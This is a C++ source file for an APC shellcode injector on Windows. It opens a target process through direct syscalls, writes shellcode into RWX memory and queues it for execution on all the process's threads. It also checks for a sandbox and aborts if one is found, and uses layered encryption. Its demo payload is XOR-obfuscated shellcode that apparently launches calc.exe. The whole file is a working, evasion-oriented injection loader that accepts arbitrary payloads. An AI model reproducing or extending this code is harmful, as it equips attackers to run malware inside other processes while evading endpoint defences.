#include "injector.h"

ApcInjector::ApcInjector(SyscallManager& sm) : m_syscalls(sm) {}

std::vector<DWORD> ApcInjector::GetThreadIds(DWORD pid) {
    std::vector<DWORD> tids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return tids;

    THREADENTRY32 te; te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do { if (te.th32OwnerProcessID == pid) tids.push_back(te.th32ThreadID); }
        while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tids;
}

bool ApcInjector::Inject(DWORD pid, const uint8_t* sc, size_t scSize) {
    Color::Cyan(); std::cout << "\n  === APC INJECTION ===\n"; Color::Reset();
    char buf[256];

    // Open process
    HANDLE hProc = nullptr;
    SF_OBJECT_ATTRIBUTES oa; SfInitObjectAttributes(&oa);
    SF_CLIENT_ID cid; cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid; cid.UniqueThread = nullptr;
    NTSTATUS st = m_syscalls.SysNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(st) || !hProc) {
        snprintf(buf, sizeof(buf), "NtOpenProcess failed: 0x%08lX", (unsigned long)st);
        PrintErr(buf); return false;
    }
    PrintOk("Process opened.");

    // Allocate RWX
    PVOID base = nullptr; SIZE_T region = scSize;
    st = m_syscalls.SysNtAllocateVirtualMemory(hProc, &base, 0, &region,
                                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st) || !base) {
        snprintf(buf, sizeof(buf), "NtAllocateVirtualMemory failed: 0x%08lX", (unsigned long)st);
        PrintErr(buf); m_syscalls.SysNtClose(hProc); return false;
    }
    snprintf(buf, sizeof(buf), "Allocated %zu bytes at 0x%p", region, base);
    PrintOk(buf);

    // Write shellcode
    SIZE_T written = 0;
    st = m_syscalls.SysNtWriteVirtualMemory(hProc, base, (PVOID)sc, scSize, &written);
    if (!NT_SUCCESS(st)) {
        PrintErr("NtWriteVirtualMemory failed.");
        m_syscalls.SysNtClose(hProc); return false;
    }
    PrintOk("Shellcode written.");

    // Queue APC to all threads
    auto tids = GetThreadIds(pid);
    if (tids.empty()) { PrintErr("No threads found."); m_syscalls.SysNtClose(hProc); return false; }

    int queued = 0;
    for (DWORD tid : tids) {
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
        if (!hThread) continue;
        st = m_syscalls.SysNtQueueApcThread(hThread, base, nullptr, nullptr, nullptr);
        if (NT_SUCCESS(st)) queued++;
        CloseHandle(hThread);
    }

    m_syscalls.SysNtClose(hProc);
    snprintf(buf, sizeof(buf), "Queued %d APC(s) across %zu thread(s)", queued, tids.size());
    queued > 0 ? PrintOk(buf) : PrintErr("No APCs queued.");
    return queued > 0;
}

bool ApcInjector::InjectEncrypted(DWORD pid, const uint8_t* enc, size_t len, uint32_t seed) {
    if (ShellcodeObfuscator::DetectSandbox()) {
        PrintWarn("Sandbox detected. Aborting."); return false;
    }
    PrintOk("Environment check passed.");

    auto dec = ShellcodeObfuscator::StagedDecrypt(enc, len, seed);
    if (dec.empty()) { PrintErr("Decryption failed."); return false; }

    char buf[64];
    snprintf(buf, sizeof(buf), "Decrypted %zu bytes", dec.size());
    PrintOk(buf);
    return Inject(pid, dec.data(), dec.size());
}

bool ApcInjector::InjectObfuscatedDemo(DWORD pid) {
    PrintInfo("Building shellcode via compile-time XOR...");

    // Rotating 4-byte key: compiler evaluates the XOR at compile time,
    // so the binary only contains the encrypted values.
    // Each expression is raw_shellcode_byte ^ key_byte — verifiable by reading.
    #define K0 0xDE
    #define K1 0xAD
    #define K2 0xBE
    #define K3 0xEF
    static const uint8_t enc[] = {
        0xFC^K0,0x48^K1,0x83^K2,0xE4^K3, 0xF0^K0,0xE8^K1,0xC0^K2,0x00^K3,
        0x00^K0,0x00^K1,0x41^K2,0x51^K3, 0x41^K0,0x50^K1,0x52^K2,0x51^K3,
        0x56^K0,0x48^K1,0x31^K2,0xD2^K3, 0x65^K0,0x48^K1,0x8B^K2,0x52^K3,
        0x60^K0,0x48^K1,0x8B^K2,0x52^K3, 0x18^K0,0x48^K1,0x8B^K2,0x52^K3,
        0x20^K0,0x48^K1,0x8B^K2,0x72^K3, 0x50^K0,0x48^K1,0x0F^K2,0xB7^K3,
        0x4A^K0,0x4A^K1,0x4D^K2,0x31^K3, 0xC9^K0,0x48^K1,0x31^K2,0xC0^K3,
        0xAC^K0,0x3C^K1,0x61^K2,0x7C^K3, 0x02^K0,0x2C^K1,0x20^K2,0x41^K3,
        0xC1^K0,0xC9^K1,0x0D^K2,0x41^K3, 0x01^K0,0xC1^K1,0xE2^K2,0xED^K3,
        0x52^K0,0x41^K1,0x51^K2,0x48^K3, 0x8B^K0,0x52^K1,0x20^K2,0x8B^K3,
        0x42^K0,0x3C^K1,0x48^K2,0x01^K3, 0xD0^K0,0x8B^K1,0x80^K2,0x88^K3,
        0x00^K0,0x00^K1,0x00^K2,0x48^K3, 0x85^K0,0xC0^K1,0x74^K2,0x67^K3,
        0x48^K0,0x01^K1,0xD0^K2,0x50^K3, 0x8B^K0,0x48^K1,0x18^K2,0x44^K3,
        0x8B^K0,0x40^K1,0x20^K2,0x49^K3, 0x01^K0,0xD0^K1,0xE3^K2,0x56^K3,
        0x48^K0,0xFF^K1,0xC9^K2,0x41^K3, 0x8B^K0,0x34^K1,0x88^K2,0x48^K3,
        0x01^K0,0xD6^K1,0x4D^K2,0x31^K3, 0xC9^K0,0x48^K1,0x31^K2,0xC0^K3,
        0xAC^K0,0x41^K1,0xC1^K2,0xC9^K3, 0x0D^K0,0x41^K1,0x01^K2,0xC1^K3,
        0x38^K0,0xE0^K1,0x75^K2,0xF1^K3, 0x4C^K0,0x03^K1,0x4C^K2,0x24^K3,
        0x08^K0,0x45^K1,0x39^K2,0xD1^K3, 0x75^K0,0xD8^K1,0x58^K2,0x44^K3,
        0x8B^K0,0x40^K1,0x24^K2,0x49^K3, 0x01^K0,0xD0^K1,0x66^K2,0x41^K3,
        0x8B^K0,0x0C^K1,0x48^K2,0x44^K3, 0x8B^K0,0x40^K1,0x1C^K2,0x49^K3,
        0x01^K0,0xD0^K1,0x41^K2,0x8B^K3, 0x04^K0,0x88^K1,0x48^K2,0x01^K3,
        0xD0^K0,0x41^K1,0x58^K2,0x41^K3, 0x58^K0,0x5E^K1,0x59^K2,0x5A^K3,
        0x41^K0,0x58^K1,0x41^K2,0x59^K3, 0x41^K0,0x5A^K1,0x48^K2,0x83^K3,
        0xEC^K0,0x20^K1,0x41^K2,0x52^K3, 0xFF^K0,0xE0^K1,0x58^K2,0x41^K3,
        0x59^K0,0x5A^K1,0x48^K2,0x8B^K3, 0x12^K0,0xE9^K1,0x57^K2,0xFF^K3,
        0xFF^K0,0xFF^K1,0x5D^K2,0x48^K3, 0xBA^K0,0x01^K1,0x00^K2,0x00^K3,
        0x00^K0,0x00^K1,0x00^K2,0x00^K3, 0x00^K0,0x48^K1,0x8D^K2,0x8D^K3,
        0x01^K0,0x01^K1,0x00^K2,0x00^K3, 0x41^K0,0xBA^K1,0x31^K2,0x8B^K3,
        0x6F^K0,0x87^K1,0xFF^K2,0xD5^K3, 0xBB^K0,0xE0^K1,0x1D^K2,0x2A^K3,
        0x0A^K0,0x41^K1,0xBA^K2,0xA6^K3, 0x95^K0,0xBD^K1,0x9D^K2,0xFF^K3,
        0xD5^K0,0x48^K1,0x83^K2,0xC4^K3, 0x28^K0,0x3C^K1,0x06^K2,0x7C^K3,
        0x0A^K0,0x80^K1,0xFB^K2,0xE0^K3, 0x75^K0,0x05^K1,0xBB^K2,0x47^K3,
        0x13^K0,0x72^K1,0x6F^K2,0x6A^K3, 0x00^K0,0x59^K1,0x41^K2,0x89^K3,
        0xDA^K0,0xFF^K1,0xD5^K2,0x63^K3,
        0x61^K0,0x6C^K1,0x63^K2,0x2E^K3, 0x65^K0,0x78^K1,0x65^K2,0x00^K3,
    };
    #undef K0
    #undef K1
    #undef K2
    #undef K3

    // Decrypt at runtime with the same rotating key
    const uint8_t key[] = {0xDE, 0xAD, 0xBE, 0xEF};
    std::vector<uint8_t> sc(sizeof(enc));
    for (size_t i = 0; i < sizeof(enc); i++)
        sc[i] = enc[i] ^ key[i % 4];

    char buf[64];
    snprintf(buf, sizeof(buf), "Reconstructed %zu bytes", sc.size());
    PrintOk(buf);

    // Now encrypt through the multi-layer pipeline before injection
    auto rtKey = ShellcodeObfuscator::DeriveRuntimeKey();
    uint32_t seed = (uint32_t)GetTickCount() ^ 0xCAFEBABE;
    auto encrypted = ShellcodeObfuscator::Encrypt(sc.data(), sc.size(),
                                                   rtKey.data(), rtKey.size(), seed);

    PrintOk("Encrypted with multi-layer pipeline.");
    return InjectEncrypted(pid, encrypted.data(), encrypted.size(), seed);
}
